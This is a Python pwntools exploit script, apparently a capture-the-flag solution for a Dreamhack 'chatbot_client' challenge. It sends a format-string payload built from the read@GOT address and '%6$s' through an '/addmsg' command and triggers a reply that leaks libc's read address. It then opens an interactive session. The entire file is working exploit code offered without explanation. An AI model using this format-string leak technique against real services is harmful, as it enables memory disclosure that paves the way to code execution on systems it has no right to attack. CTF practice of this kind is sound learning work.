from pwn import *
import time

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF('./chatbot_client')
libc = ELF("./libc-2.31.so")

def slog(n, a): return success(": ".join([n, hex(a)]))

HOST, PORT = "host8.dreamhack.games 80".split()

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process(["./chatbot_client", "127.0.0.1", "31337"])

# gdb.attach(p)
# pause()

# pay = b'AAAA'
# pay += b'%p.%p.%p.%p.%p.%p.%p.%p'

pay = p64(elf.got["read"])
pay += b'%6$s'

for i in range(20):
    p.sendlineafter(b'client: ', b'/addmsg ' + pay)
    p.recvuntil(b'server: Thank you for improving me :)')

p.sendlineafter(b'client: ', b'bankai!')
p.recvuntil(b'server: ')
out = u64(p.recvline()[:-1])

slog("read@GOT", out)

p.interactive()